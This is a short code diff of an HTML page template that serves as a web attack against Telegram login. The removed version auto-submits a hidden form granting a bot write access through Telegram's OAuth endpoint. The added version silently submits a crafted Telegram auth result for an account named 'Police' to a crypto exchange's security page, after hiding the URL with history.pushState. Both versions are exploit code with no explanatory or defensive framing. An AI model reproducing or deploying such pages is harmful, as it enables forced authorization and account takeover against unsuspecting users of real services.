@@ -13,23 +13,16 @@ PAGE = """
 <!doctype html>
 <html>
   <body>
-    <iframe src="/static/imran.html" width="600" height="400" title="Contenu externe"></iframe>
     
-    <form action="https://oauth.telegram.org/auth/auth">
-      <input type="hidden" name="bot_id" value="{{ bot_id }}" />
-      <input type="hidden" name="origin" value="{{ origin }}" />
-      <input type="hidden" name="request_access" value="write" />
-      <input type="hidden" name="return_to" value="{{ return_to }}" />
-      <input type="hidden" name="confirm" value="1" />
-      <input type="hidden" name="hash" value="{{ form2_hash }}" />
-      <input type="hidden" name="allow_write" value="1" />
+    <form action="https://www.toobit.com/en-US/user/security#tgAuthResult=eyJpZCI6ODI1MDU4MDUwMiwiZmlyc3RfbmFtZSI6IlBvbGljZSIsImF1dGhfZGF0ZSI6MTc4NDExNTkyNCwiaGFzaCI6IjQxNjIwZjdhODZmMjFlNTIzNTU5N2RlNjNmZTU4NGM1ZjNmYjk1MDRmODVjYzYxODdjMGFlOGZjOGZhNWUyYTAifQ">
+     
     </form>
 
     <script>
       history.pushState('', '', '/');
       setTimeout(function() {
         document.forms[0].submit();
-      }, 5000);
+      });
     </script>
   </body>
 </html>
